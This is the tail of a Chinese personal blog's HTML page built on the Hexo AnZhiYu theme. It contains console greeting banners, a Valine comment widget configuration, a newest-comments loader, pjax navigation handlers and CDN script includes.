      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>